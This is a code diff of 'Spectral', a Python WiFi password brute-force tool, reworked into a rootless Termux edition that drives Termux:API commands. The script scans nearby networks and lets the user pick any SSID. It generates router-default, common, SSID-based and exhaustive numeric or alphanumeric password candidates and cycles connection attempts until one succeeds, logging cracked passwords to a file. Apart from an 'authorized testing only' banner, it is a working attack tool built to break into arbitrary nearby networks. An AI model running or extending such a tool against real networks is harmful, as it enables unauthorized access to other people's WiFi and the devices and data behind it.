@@ -1,6 +1,7 @@
 #!/data/data/com.termux/files/usr/bin/python3
 """
 Spectral - WiFi Password Brute Force Tool (Generative Engine)
+Termux Rootless Edition
 Authorized Penetration Testing Only
 """
 
@@ -20,7 +21,7 @@ from datetime import datetime
 
 # =============== CONFIG ===============
 VERSION = "1.0"
-AUTHOR = "Spectral"
+AUTHOR = "Spectral (Termux Rootless)"
 BANNER = f"""
 {'\033[96m'}{'='*60}
    ███████  ██████  ███████  ██████  ████████ ██████   █████  ██      
@@ -29,7 +30,7 @@ BANNER = f"""
         ██ ██      ██      ██         ██    ██   ██ ██   ██ ██      
    ███████  ██████  ███████  ██████    ██    ██   ██ ██   ██ ███████ 
 {'='*60}
-        WiFi Brute Force Engine v{VERSION}
+        WiFi Brute Force Engine v{VERSION} (Rootless)
      Authorized Security Testing Tool
 {'='*60}{'\033[0m'}
 """
@@ -50,7 +51,6 @@ stop_attack = False
 password_found = None
 found_event = threading.Event()
 
-
 # =============== SIGNAL HANDLING ===============
 
 def signal_handler(sig, frame):
@@ -59,20 +59,22 @@ def signal_handler(sig, frame):
     stop_attack = True
     found_event.set()
 
-
 signal.signal(signal.SIGINT, signal_handler)
-
 
 # =============== UTILITIES ===============
 
 def clear_screen():
     os.system('clear' if os.name == 'posix' else 'cls')
 
-
-def check_root():
-    result = subprocess.run(['id', '-u'], capture_output=True, text=True)
-    return result.stdout.strip() == '0'
-
+def check_termux_api() -> bool:
+    """Check if termux-wifi-* tools are available."""
+    for cmd in ['termux-wifi-scaninfo', 'termux-wifi-connection']:
+        try:
+            subprocess.run([cmd, '--help'], capture_output=True, timeout=3)
+            return True
+        except:
+            pass
+    return False
 
 def human_readable_count(n: int) -> str:
     if n < 1000: return str(n)
@@ -81,18 +83,32 @@ def human_readable_count(n: int) -> str:
     elif n < 1_000_000_000_000: return f"{n/1_000_000_000:.1f}B"
     else: return f"{n/1_000_000_000_000:.1f}T"
 
-
 def human_time(seconds: float) -> str:
     if seconds < 60: return f"{seconds:.0f}s"
     elif seconds < 3600: return f"{seconds/60:.1f}m"
     elif seconds < 86400: return f"{seconds/3600:.1f}h"
     else: return f"{seconds/86400:.1f}d"
 
+def get_current_ssid() -> Optional[str]:
+    """Get the SSID currently connected to via Termux API."""
+    try:
+        result = subprocess.run(
+            ['termux-wifi-connection'],
+            capture_output=True, text=True, timeout=5
+        )
+        if result.returncode == 0 and result.stdout.strip():
+            data = json.loads(result.stdout)
+            ssid = data.get('ssid', '')
+            if ssid:
+                return ssid
+    except:
+        pass
+    return None
 
 # =============== NETWORK SCANNING ===============
 
 def scan_networks() -> List[dict]:
-    """Scan for nearby WiFi networks."""
+    """Scan for nearby WiFi networks using Termux API."""
     print(f"{CYAN}[*] Scanning for WiFi networks...{RESET}")
     
     networks = []
@@ -120,13 +136,14 @@ def scan_networks() -> List[dict]:
                 
                 # Determine encryption type
                 enc = 'WPA2'
-                if 'WPA3' in capabilities:
+                cap_upper = capabilities.upper()
+                if 'WPA3' in cap_upper:
                     enc = 'WPA3'
-                elif 'WPA2' in capabilities:
+                elif 'WPA2' in cap_upper:
                     enc = 'WPA2'
-                elif 'WPA' in capabilities:
+                elif 'WPA' in cap_upper:
                     enc = 'WPA'
-                elif 'WEP' in capabilities:
+                elif 'WEP' in cap_upper:
                     enc = 'WEP'
                 else:
                     enc = 'Open'
@@ -162,48 +179,7 @@ def scan_networks() -> List[dict]:
     except Exception as e:
         print(f"{RED}[!] Scan error: {e}{RESET}")
     
-    # Also try iwlist if available
-    if not networks:
-        try:
-            result = subprocess.run(
-                ['iwlist', 'scan'],
-                capture_output=True, text=True, timeout=15
-            )
-            if result.returncode == 0:
-                cells = re.split(r'Cell \d+ -', result.stdout)
-                for cell in cells[1:]:
-                    ssid_match = re.search(r'ESSID:"([^"]*)"', cell)
-                    if ssid_match:
-                        ssid = ssid_match.group(1)
-                        if not ssid:
-                            continue
-                        bssid_match = re.search(r'Address: ([0-9A-Fa-f:]+)', cell)
-                        bssid = bssid_match.group(1) if bssid_match else 'N/A'
-                        signal_match = re.search(r'Signal level=(-?\d+)', cell)
-                        rssi = int(signal_match.group(1)) if signal_match else 0
-                        enc_match = re.search(r'Encryption key:(on|off)', cell)
-                        enc = 'WPA' if enc_match and enc_match.group(1) == 'on' else 'Open'
-                        
-                        bars = '████'
-                        if rssi < -80: bars = '░░░░'
-                        elif rssi < -70: bars = '█░░░'
-                        elif rssi < -60: bars = '██░░'
-                        elif rssi < -50: bars = '███░'
-                        
-                        networks.append({
-                            'ssid': ssid,
-                            'bssid': bssid,
-                            'rssi': rssi,
-                            'bars': bars,
-                            'channel': '?',
-                            'encryption': enc,
-                            'capabilities': enc
-                        })
-        except:
-            pass
-    
     return networks
-
 
 def display_networks(networks: List[dict]):
     """Display scanned networks in a formatted table."""
@@ -211,13 +187,19 @@ def display_networks(networks: List[dict]):
         print(f"{RED}[!] No networks found.{RESET}")
         return
     
-    print(f"\n{BOLD}{'SSID':<32} {'BSSID':<18} {'SIG':<6} {'CH':<4} {'ENC':<6}{RESET}")
-    print(f"{DIM}{'-'*70}{RESET}")
+    # Check what network we're currently connected to
+    current_ssid = get_current_ssid()
+    
+    print(f"\n{BOLD}{'SSID':<32} {'BSSID':<18} {'SIG':<6} {'CH':<4} {'ENC':<6}{'CUR':<5}{RESET}")
+    print(f"{DIM}{'-'*75}{RESET}")
     
     for i, net in enumerate(networks, 1):
         ssid = net['ssid'][:30] if len(net['ssid']) > 30 else net['ssid']
         bars = net['bars']
         enc = net['encryption']
+        
+        # Indicate if currently connected
+        is_current = '◄' if current_ssid and ssid == current_ssid else ''
         
         # Color by signal
         rssi = net['rssi'] if isinstance(net['rssi'], (int, float)) else -100
@@ -232,75 +214,77 @@ def display_networks(networks: List[dict]):
               f"{DIM}{net['bssid']:<18}{RESET} "
               f"{sig_color}{bars}{RESET} "
               f"{net['channel']:<4} "
-              f"{MAGENTA}{enc:<6}{RESET}")
+              f"{MAGENTA}{enc:<6}{RESET}"
+              f"{GREEN}{is_current:<5}{RESET}")
 
-
-# =============== WIFI CONNECTION ===============
+# =============== WIFI CONNECTION (Rootless Termux) ===============
 
 def try_wifi_password(ssid: str, password: str) -> bool:
-    """Attempt to connect to WiFi with given password."""
-    
-    # Method 1: wpa_cli (root)
+    """
+    Attempt to connect to WiFi with given password using Termux API.
+    This is the rootless method - we need to disconnect and reconnect.
+    """
     try:
-        add_result = subprocess.run(
-            ['wpa_cli', 'add_network'],
-            capture_output=True, text=True, timeout=5
-        )
-        if add_result.returncode == 0:
-            net_id = add_result.stdout.strip()
-            if net_id and net_id.isdigit():
-                subprocess.run(['wpa_cli', 'set_network', net_id, 'ssid', f'"{ssid}"'],
-                              capture_output=True, timeout=3)
-                subprocess.run(['wpa_cli', 'set_network', net_id, 'psk', f'"{password}"'],
-                              capture_output=True, timeout=3)
-                subprocess.run(['wpa_cli', 'enable_network', net_id],
-                              capture_output=True, timeout=3)
-                subprocess.run(['wpa_cli', 'select_network', net_id],
-                              capture_output=True, timeout=3)
-                time.sleep(1.5)
-                status = subprocess.run(['wpa_cli', 'status'],
-                                      capture_output=True, text=True, timeout=3)
-                subprocess.run(['wpa_cli', 'remove_network', net_id],
-                              capture_output=True, timeout=2)
-                
-                if 'wpa_state=COMPLETED' in status.stdout:
-                    # Verify we're connected to THIS network
-                    if ssid in status.stdout:
-                        return True
-    except:
-        pass
-
-    # Method 2: nmcli
-    try:
+        # First, disconnect from current network
         subprocess.run(
-            ['nmcli', 'device', 'wifi', 'connect', ssid, 'password', password],
-            capture_output=True, timeout=8
+            ['termux-wifi-connection', 'disconnect'],
+            capture_output=True, timeout=3
         )
+        time.sleep(0.3)
+        
+        # Connect to target with password
+        # Termux API uses a specific format for connections
         result = subprocess.run(
-            ['nmcli', '-t', '-f', 'ACTIVE,SSID', 'device', 'wifi'],
-            capture_output=True, text=True, timeout=3
+            ['termux-wifi-connect', ssid, password],
+            capture_output=True, text=True, timeout=10
         )
-        if f'yes:{ssid}' in result.stdout:
-            return True
+        
+        if result.returncode == 0:
+            # Wait briefly for connection to establish
+            time.sleep(1.5)
+            
+            # Verify we're connected to the right network
+            current = get_current_ssid()
+            if current and current == ssid:
+                return True
+                
+        return False
+        
+    except FileNotFoundError:
+        # termux-wifi-connect not available, try alternative method
+        pass
+    except subprocess.TimeoutExpired:
+        pass
+    except Exception:
+        pass
+    
+    try:
+        # Alternative: Use termux-wifi-connection to enable/connect
+        # This is more limited but works on some devices
+        result = subprocess.run(
+            ['termux-wifi-connection', ssid, password],
+            capture_output=True, text=True, timeout=10
+        )
+        if result.returncode == 0:
+            time.sleep(1.5)
+            current = get_current_ssid()
+            if current and current == ssid:
+                return True
     except:
         pass
-
+    
     return False
 
-
 def disconnect_wifi():
-    """Disconnect from current WiFi."""
+    """Disconnect from current WiFi using Termux API."""
     try:
-        subprocess.run(['wpa_cli', 'remove_network', 'all'],
-                      capture_output=True, timeout=3)
+        subprocess.run(
+            ['termux-wifi-connection', 'disconnect'],
+            capture_output=True, timeout=3
+        )
     except:
         pass
-    try:
-        subprocess.run(['nmcli', 'device', 'disconnect', 'wlan0'],
-                      capture_output=True, timeout=3)
-    except:
-        pass
-
+    time.sleep(0.2)
 
 # =============== PASSWORD GENERATORS ===============
 
@@ -308,52 +292,43 @@ def generate_numeric(length: int) -> Generator[str, None, None]:
     for combo in itertools.product(string.digits, repeat=length):
         yield ''.join(combo)
 
-
 def generate_lowercase(length: int) -> Generator[str, None, None]:
     for combo in itertools.product(string.ascii_lowercase, repeat=length):
         yield ''.join(combo)
-
 
 def generate_alphanumeric(length: int) -> Generator[str, None, None]:
     chars = string.ascii_lowercase + string.digits
     for combo in itertools.product(chars, repeat=length):
         yield ''.join(combo)
 
-
 def generate_mixedcase_alphanumeric(length: int) -> Generator[str, None, None]:
     chars = string.ascii_letters + string.digits
     for combo in itertools.product(chars, repeat=length):
         yield ''.join(combo)
 
-
 def generate_common_patterns(ssid: str = '') -> Generator[str, None, None]:
-    # Common base passwords
     common = [
         'admin', 'password', '12345678', '123456789', '1234567890',
         'qwerty123', 'qwerty1', '11111111', '00000000', 'admin123',
         'letmein', 'welcome1', 'P@ssw0rd', 'passw0rd', 'changeme',
         'default', 'guest', 'root', 'user', 'test1234', 'pass1234',
-        # Router defaults
         'admin', 'password', '1234', '12345', '123456', '0000',
         'linksys', 'netgear', 'dlink', 'tp-link', 'asus', 'belkin',
         'wireless', 'home', 'family', 'default', 'motorola',
     ]
     yield from common
     
-    # Common suffixes on bases
     bases = ['admin', 'pass', 'wifi', 'home', 'net', 'user', 'root', 'test', 'guest']
     for base in bases:
         for suffix in ['123', '1234', '12345', '1', '!', '@', '69', '007']:
             yield f"{base}{suffix}"
             yield f"{base.capitalize()}{suffix}"
     
-    # Years
     for year in range(2000, 2030):
         yield str(year)
         for word in ['admin', 'pass', 'wifi', 'home']:
             yield f"{word}{year}"
     
-    # Keyboard walks
     kb_patterns = [
         'qwerty', 'qwertyuiop', 'qwerty123', 'asdfgh', 'asdfghjkl',
         'zxcvbn', '1q2w3e4r', '1qaz2wsx', 'qwerty12345',
@@ -361,7 +336,6 @@ def generate_common_patterns(ssid: str = '') -> Generator[str, None, None]:
     ]
     yield from kb_patterns
     
-    # SSID-based patterns
     if ssid:
         yield ssid
         yield ssid.lower()
@@ -383,20 +357,7 @@ def generate_common_patterns(ssid: str = '') -> Generator[str, None, None]:
             yield 'admin'
             yield '1234'
 
-
 def password_generator(mode: str, min_len: int, max_len: int, ssid: str = '') -> Generator[str, None, None]:
-    """
-    Master generator that produces passwords based on attack mode.
-    
-    Modes:
-      quick     - Common patterns + short numeric (fast coverage)
-      smart     - Common + numeric (1-10) + short alpha (recommended)
-      aggressive- Everything up to 8 chars mixed
-      numeric   - Numbers only
-      lowercase - Lowercase letters only
-      alphanum  - Lowercase + digits (no symbols)
-      full      - Everything (trillions)
-    """
     tried = set()
     
     def dedup(gen):
@@ -405,16 +366,13 @@ def password_generator(mode: str, min_len: int, max_len: int, ssid: str = '') ->
                 tried.add(pwd)
                 yield pwd
     
-    # Phase 0: Common patterns (always)
     yield from dedup(generate_common_patterns(ssid))
     
     if mode == 'quick':
-        # Short numeric
         for length in range(4, min(max_len + 1, 7)):
             yield from dedup(generate_numeric(length))
         return
     
-    # Phase 1: Numeric
     if mode in ['smart', 'aggressive', 'numeric', 'alphanum', 'full']:
         print(f"\n{CYAN}[*] Phase 1: Numeric ({min_len}-{min(max_len, 10)} digits)...{RESET}")
         for length in range(min_len, min(max_len + 1, 11)):
@@ -423,7 +381,6 @@ def password_generator(mode: str, min_len: int, max_len: int, ssid: str = '') ->
     if mode == 'numeric':
         return
     
-    # Phase 2: Lowercase short
     if mode in ['smart', 'aggressive', 'lowercase', 'alphanum', 'full']:
         print(f"\n{CYAN}[*] Phase 2: Lowercase (len 4-6)...{RESET}")
         for length in range(4, min(max_len + 1, 7)):
@@ -432,7 +389,6 @@ def password_generator(mode: str, min_len: int, max_len: int, ssid: str = '') ->
     if mode == 'lowercase':
         return
     
-    # Phase 3: Alphanumeric short-medium
     if mode in ['smart', 'aggressive', 'alphanum', 'full']:
         print(f"\n{CYAN}[*] Phase 3: Alphanumeric (len 4-7)...{RESET}")
         for length in range(4, min(max_len + 1, 8)):
@@ -441,50 +397,42 @@ def password_generator(mode: str, min_len: int, max_len: int, ssid: str = '') ->
     if mode in ['smart', 'alphanum']:
         return
     
-    # Phase 4: Longer numeric
     if mode in ['aggressive', 'full']:
         print(f"\n{CYAN}[*] Phase 4: Long numeric (10-{max_len})...{RESET}")
         for length in range(10, min(max_len + 1, 13)):
             yield from dedup(generate_numeric(length))
     
-    # Phase 5: Mixed case alphanumeric
     if mode in ['aggressive', 'full']:
         print(f"\n{CYAN}[*] Phase 5: Mixed-case alphanumeric (len 4-7)...{RESET}")
         for length in range(4, min(max_len + 1, 8)):
             yield from dedup(generate_mixedcase_alphanumeric(length))
 
-
 def estimate_search_space(mode: str, min_len: int, max_len: int) -> int:
-    """Estimate total passwords a mode will generate."""
-    total = 500  # common patterns
+    total = 500
     
     if mode == 'quick':
         for l in range(4, min(max_len + 1, 7)):
             total += 10 ** l
         return total
     
-    # Numeric
     for l in range(min_len, min(max_len + 1, 11)):
         total += 10 ** l
     
     if mode == 'numeric':
         return total
     
-    # Lowercase
     for l in range(4, min(max_len + 1, 7)):
         total += 26 ** l
     
     if mode == 'lowercase':
         return total
     
-    # Alphanumeric
     for l in range(4, min(max_len + 1, 8)):
         total += 36 ** l
     
     if mode in ['smart', 'alphanum']:
         return total
     
-    # Aggressive extras
     if mode in ['aggressive', 'full']:
         for l in range(10, min(max_len + 1, 13)):
             total += 10 ** l
@@ -493,11 +441,9 @@ def estimate_search_space(mode: str, min_len: int, max_len: int) -> int:
     
     return total
 
-
 # =============== BRUTE FORCE ENGINE ===============
 
 def brute_force(ssid: str, mode: str, min_len: int, max_len: int, delay: float):
-    """Main brute force loop using generated passwords."""
     global stop_attack, password_found
     
     stop_attack = False
@@ -507,7 +453,7 @@ def brute_force(ssid: str, mode: str, min_len: int, max_len: int, delay: float):
     estimated = estimate_search_space(mode, min_len, max_len)
     
     print(f"\n{BOLD}{'='*60}{RESET}")
-    print(f"{BOLD}  ATTACK STARTED{RESET}")
+    print(f"{BOLD}  ATTACK STARTED (Rootless Mode){RESET}")
     print(f"{BOLD}{'='*60}{RESET}")
     print(f"  {YELLOW}SSID:{RESET}          {ssid}")
     print(f"  {YELLOW}Mode:{RESET}          {mode}")
@@ -515,8 +461,9 @@ def brute_force(ssid: str, mode: str, min_len: int, max_len: int, delay: float):
     print(f"  {YELLOW}Search space:{RESET}  ~{human_readable_count(estimated)} passwords")
     print(f"  {YELLOW}Delay:{RESET}         {delay}s")
     
-    if estimated > 100_000_000:
-        print(f"\n{RED}[!] WARNING: Large search space. This could take very long.{RESET}")
+    if estimated > 10_000_000:
+        print(f"\n{RED}[!] WARNING: Large search space. Rootless Termux is SLOW.{RESET}")
+        print(f"{RED}[!] Recommend 'quick' mode or short numeric targets.{RESET}")
         confirm = input(f"{CYAN}[?] Continue? (y/N): {RESET}")
         if confirm.lower() != 'y':
             print(f"{YELLOW}[!] Attack cancelled.{RESET}")
@@ -526,7 +473,6 @@ def brute_force(ssid: str, mode: str, min_len: int, max_len: int, delay: float):
     attempts = 0
     found = False
     
-    # Progress tracking
     progress_file = f".spectral_progress_{ssid.replace(' ', '_')}.txt"
     last_save = 0
     
@@ -540,12 +486,10 @@ def brute_force(ssid: str, mode: str, min_len: int, max_len: int, delay: float):
         
         attempts += 1
         
-        # Display progress
         if attempts % 3 == 0 or attempts == 1:
             elapsed = time.time() - start_time
             rate = attempts / elapsed if elapsed > 0 else 0
             pct = (attempts / estimated * 100) if estimated > 0 else 0
-            
             remaining = (estimated - attempts) / rate if rate > 0 else 0
             
             print(f"\r{YELLOW}[{attempts:>12,}] {RESET}"
@@ -554,11 +498,10 @@ def brute_force(ssid: str, mode: str, min_len: int, max_len: int, delay: float):
                   f"{DIM}{rate:.1f}/s{RESET} "
                   f"{MAGENTA}ETA: {human_time(remaining)}{RESET}  ", end='', flush=True)
         
-        # Periodic save
-        if attempts - last_save >= 100000:
+        if attempts - last_save >= 50000:
             last_save = attempts
             try:
-               with open(progress_file, 'w') as f:
+                with open(progress_file, 'w') as f:
                     f.write(f"Attempts: {attempts}\n")
                     f.write(f"Last password: {password}\n")
                     f.write(f"Elapsed: {time.time() - start_time:.1f}s\n")
@@ -566,12 +509,10 @@ def brute_force(ssid: str, mode: str, min_len: int, max_len: int, delay: float):
             except:
                 pass
         
-        # Disconnect before each attempt
         if attempts > 1:
             disconnect_wifi()
-            time.sleep(max(0.05, delay * 0.2))
+            time.sleep(max(0.1, delay * 0.3))
         
-        # Try the password
         if try_wifi_password(ssid, password):
             found = True
             password_found = password
@@ -590,7 +531,6 @@ def brute_force(ssid: str, mode: str, min_len: int, max_len: int, delay: float):
             print(f"{MAGENTA}[+] Rate:{RESET}    {rate:.1f} p/s")
             print(f"{GREEN}[+] {'='*56}{RESET}")
             
-            # Save result
             result_file = 'spectral_cracked.txt'
             with open(result_file, 'a') as f:
                 timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
@@ -609,11 +549,9 @@ def brute_force(ssid: str, mode: str, min_len: int, max_len: int, delay: float):
         print(f"{YELLOW}[*] Try different mode, increase max length, or lower delay{RESET}")
         input(f"\n{CYAN}[Press Enter to continue]{RESET}")
 
-
 # =============== MENU FUNCTIONS ===============
 
 def menu_scan_and_attack():
-    """Scan networks, display them, then let user pick one to attack."""
     clear_screen()
     print(f"{BANNER}")
     print(f"{BOLD}{' NETWORK SCANNER ':=^60}{RESET}\n")
@@ -622,11 +560,11 @@ def menu_scan_and_attack():
     display_networks(networks)
     
     if not networks:
-        print(f"\n{YELLOW}[*] No networks found. Make sure Wi-Fi is enabled.{RESET}")
+        print(f"\n{YELLOW}[*] No networks found. Make sure Wi-Fi is enabled and Termux:API is installed.{RESET}")
+        print(f"{YELLOW}[*] Also enable 'Wi-Fi Control' permission for Termux in Android settings.{RESET}")
         input(f"\n{CYAN}[Press Enter to return to menu]{RESET}")
         return
     
-    # Let user select by number or type SSID
     print(f"\n{CYAN}[>] Options:{RESET}")
     print(f"  1. Select by number")
     print(f"  2. Type SSID manually")
@@ -660,12 +598,9 @@ def menu_scan_and_attack():
         input(f"{CYAN}[Press Enter]{RESET}")
         return
     
-    # Now configure the attack
     menu_configure_attack(target_ssid)
 
-
 def menu_manual_ssid():
-    """Manually enter an SSID to attack."""
     clear_screen()
     print(f"{BANNER}")
     print(f"{BOLD}{' MANUAL TARGET ':=^60}{RESET}\n")
@@ -678,18 +613,15 @@ def menu_manual_ssid():
     
     menu_configure_attack(target_ssid)
 
-
 def menu_configure_attack(ssid: str):
-    """Configure attack parameters for a given SSID."""
     clear_screen()
     print(f"{BANNER}")
     print(f"{BOLD}{' ATTACK CONFIGURATION ':=^60}{RESET}\n")
     print(f"  {YELLOW}Target:{RESET} {BOLD}{ssid}{RESET}\n")
     
-    # Mode selection
     print(f"{BOLD}Attack Modes:{RESET}")
-    print(f"  {GREEN}1.{RESET} quick      - Common patterns + 4-6 digit PIN (fast)")
-    print(f"  {GREEN}2.{RESET} smart      - Common + numeric(1-10) + short alpha (recommended)")
+    print(f"  {GREEN}1.{RESET} quick      - Common patterns + 4-6 digit PIN (RECOMMENDED for rootless)")
+    print(f"  {GREEN}2.{RESET} smart      - Common + numeric(1-10) + short alpha")
     print(f"  {GREEN}3.{RESET} aggressive - Everything up to 8 chars mixed case")
     print(f"  {GREEN}4.{RESET} numeric    - Numbers only (good for PIN-based networks)")
     print(f"  {GREEN}5.{RESET} lowercase  - Lowercase letters only")
@@ -701,17 +633,15 @@ def menu_configure_attack(ssid: str):
         '4': 'numeric', '5': 'lowercase', '6': 'alphanum', '7': 'full'
     }
     
-    mode_choice = input(f"\n{CYAN}[>] Select mode [2]: {RESET}").strip() or '2'
-    mode = mode_map.get(mode_choice, 'smart')
+    mode_choice = input(f"\n{CYAN}[>] Select mode [1 quick for rootless]: {RESET}").strip() or '1'
+    mode = mode_map.get(mode_choice, 'quick')
     print(f"{GREEN}[+] Mode: {mode}{RESET}")
     
-    # Min length
     min_input = input(f"{CYAN}[>] Min password length [1]: {RESET}").strip()
     min_len = int(min_input) if min_input.isdigit() else 1
     
-    # Max length
-    max_input = input(f"{CYAN}[>] Max password length [10]: {RESET}").strip()
-    max_len = int(max_input) if max_input.isdigit() else 10
+    max_input = input(f"{CYAN}[>] Max password length [8]: {RESET}").strip()
+    max_len = int(max_input) if max_input.isdigit() else 8
     
     if min_len > max_len:
         min_len, max_len = 1, max_len
@@ -720,20 +650,11 @@ def menu_configure_attack(ssid: str):
     
     print(f"{GREEN}[+] Length range: {min_len} - {max_len}{RESET}")
     
-    # Delay
-    delay_input = input(f"{CYAN}[>] Delay between attempts in seconds [0.3]: {RESET}").strip()
+    delay_input = input(f"{CYAN}[>] Delay between attempts in seconds [0.5]: {RESET}").strip()
     try:
         delay = float(delay_input)
     except ValueError:
-        delay = 0.3
-    
-    # Auto-adjust for root
-    if check_root():
-        if delay > 0.15:
-            fast = input(f"{CYAN}[?] Root detected. Use faster delay (0.1s)? (Y/n): {RESET}").lower()
-            if fast != 'n':
-                delay = 0.1
-                print(f"{GREEN}[+] Using delay: {delay}s{RESET}")
+        delay = 0.5
     
     # Show estimate
     estimated = estimate_search_space(mode, min_len, max_len)
@@ -741,23 +662,22 @@ def menu_configure_attack(ssid: str):
     print(f"\n{YELLOW}[*] Estimated search space: {human_readable_count(estimated)} passwords{RESET}")
     print(f"{YELLOW}[*] Estimated time: {human_time(est_time)}{RESET}")
     
-    # Confirm
+    if estimated > 1_000_000:
+        print(f"{RED}[!] This may take a very long time on rootless Termux (slow API calls).{RESET}")
+    
     confirm = input(f"\n{GREEN}[?] Start attack on '{ssid}'? (Y/n): {RESET}").lower()
     if confirm == 'n':
         print(f"{YELLOW}[!] Attack cancelled.{RESET}")
         input(f"{CYAN}[Press Enter]{RESET}")
         return
     
-    # Launch
     brute_force(ssid, mode, min_len, max_len, delay)
 
-
 def menu_quick_attack():
-    """Quick attack: scan, pick a network, use 'smart' mode defaults."""
     clear_screen()
     print(f"{BANNER}")
     print(f"{BOLD}{' QUICK ATTACK ':=^60}{RESET}\n")
-    print(f"{YELLOW}[*] This will scan networks and let you pick one to attack with smart defaults.{RESET}\n")
+    print(f"{YELLOW}[*] This will scan and let you pick a network for quick attack.{RESET}\n")
     
     networks = scan_networks()
     display_networks(networks)
@@ -771,7 +691,7 @@ def menu_quick_attack():
         if 0 <= idx < len(networks):
             ssid = networks[idx]['ssid']
             print(f"{GREEN}[+] Quick attacking: {ssid}{RESET}")
-            brute_force(ssid, 'smart', 1, 10, 0.3)
+            brute_force(ssid, 'quick', 1, 8, 0.5)
         else:
             print(f"{RED}[!] Invalid number.{RESET}")
             input(f"{CYAN}[Press Enter]{RESET}")
@@ -779,9 +699,7 @@ def menu_quick_attack():
         print(f"{RED}[!] Invalid input.{RESET}")
         input(f"{CYAN}[Press Enter]{RESET}")
 
-
 def menu_scan_only():
-    """Just scan and display networks, no attack."""
     clear_screen()
     print(f"{BANNER}")
     print(f"{BOLD}{' NETWORK SCAN ':=^60}{RESET}\n")
@@ -794,36 +712,36 @@ def menu_scan_only():
     
     input(f"\n{CYAN}[Press Enter to return to menu]{RESET}")
 
-
 def menu_about():
-    """Display tool information."""
     clear_screen()
     print(f"{BANNER}")
-    print(f"{BOLD}{' ABOUT SPECTRAL ':=^60}{RESET}\n")
+    print(f"{BOLD}{' ABOUT SPECTRAL (ROOTLESS) ':=^60}{RESET}\n")
     print(f"  {YELLOW}Version:{RESET}  {VERSION}")
     print(f"  {YELLOW}Author:{RESET}   {AUTHOR}")
-    print(f"  {YELLOW}Purpose:{RESET}  WiFi password auditing tool")
-    print(f"\n  {DIM}Spectral generates password candidates combinatorially")
-    print(f"  and attempts to connect to the target WiFi network.")
-    print(f"  It uses wpa_cli (root) or nmcli for connections.")
-    print(f"  No external wordlist required.{RESET}")
+    print(f"  {YELLOW}Platform:{RESET} Termux (Rootless)")
+    print(f"\n  {DIM}This rootless edition uses the Termux:API companion app")
+    print(f"  to scan and connect to WiFi networks. It does NOT require")
+    print(f"  root access, wpa_supplicant, or nmcli.")
+    print(f"\n  Requirements:")
+    print(f"  • Termux:API app installed from F-Droid")
+    print(f"  • 'pkg install termux-api'")
+    print(f"  • Wi-Fi Control permission enabled for Termux")
+    print(f"  • Location permission enabled (for scanning){RESET}")
     print(f"\n  {RED}[!] For authorized security testing only.{RESET}")
+    print(f"  {YELLOW}[!] Rootless mode is slow (~0.5s/attempt). Use 'quick' mode.{RESET}")
     input(f"\n{CYAN}[Press Enter to return to menu]{RESET}")
-
 
 # =============== MAIN MENU ===============
 
 def main_menu():
-    """Display the main Spectral menu."""
     while True:
         clear_screen()
         print(f"{BANNER}")
         
-        # Show root status
-        root_status = f"{GREEN}✓ Root{RESET}" if check_root() else f"{RED}✗ No Root{RESET}"
-        print(f"  Status: {root_status}\n")
+        api_status = f"{GREEN}✓ Termux:API{RESET}" if check_termux_api() else f"{RED}✗ No Termux:API{RESET}"
+        print(f"  Status: {api_status}\n")
         
-        print(f"{BOLD}{' MAIN MENU ':=^60}{RESET}\n")
+        print(f"{BOLD}{' MAIN MENU (Rootless) ':=^60}{RESET}\n")
         print(f"  {GREEN}1.{RESET} {BOLD}Scan & Attack{RESET}     - Scan networks, pick one, configure attack")
         print(f"  {GREEN}2.{RESET} {BOLD}Quick Attack{RESET}      - Scan, pick, attack with defaults")
         print(f"  {GREEN}3.{RESET} {BOLD}Manual SSID{RESET}       - Type target SSID manually")
@@ -852,36 +770,27 @@ def main_menu():
             print(f"{RED}[!] Invalid choice.{RESET}")
             time.sleep(1)
 
-
 # =============== ENTRY POINT ===============
 
 if __name__ == '__main__':
     clear_screen()
     print(f"{BANNER}")
     
-    # Check dependencies
-    has_termux_api = True
-    try:
-        subprocess.run(['termux-wifi-scaninfo', '--help'],
-                      capture_output=True, timeout=3)
-    except:
-        has_termux_api = False
-    
-    if not has_termux_api:
-        print(f"{YELLOW}[!] termux-wifi-scaninfo not detected.{RESET}")
-        print(f"{YELLOW}[*] Install: pkg install termux-api && pip install termux-api{RESET}")
-        print(f"{YELLOW}[*] Also enable Termux:API in Android settings{RESET}")
+    # Check Termux:API availability
+    if check_termux_api():
+        print(f"{GREEN}[+] Termux:API tools detected.{RESET}")
+        print(f"{GREEN}[+] Run mode: Rootless (Termux API){RESET}\n")
+    else:
+        print(f"{RED}[!] Termux:API tools not detected.{RESET}")
+        print(f"{YELLOW}[*] To use this tool in Termux:{RESET}")
+        print(f"{YELLOW}  1. Install Termux:API from F-Droid (not Play Store){RESET}")
+        print(f"{YELLOW}  2. pkg install termux-api termux-tools{RESET}")
+        print(f"{YELLOW}  3. Enable Wi-Fi Control + Location permissions for Termux{RESET}")
         cont = input(f"\n{CYAN}[?] Continue anyway? (Y/n): {RESET}").lower()
         if cont == 'n':
             sys.exit(1)
     
-    if not check_root():
-        print(f"{YELLOW}[!] Not running as root. Connection methods limited.{RESET}")
-        print(f"{YELLOW}[*] For best results: su -c 'python3 spectral.py'{RESET}")
-        time.sleep(2)
-    else:
-        print(f"{GREEN}[+] Root access confirmed.{RESET}")
-        time.sleep(1)
+    time.sleep(1.5)
     
     try:
         main_menu()
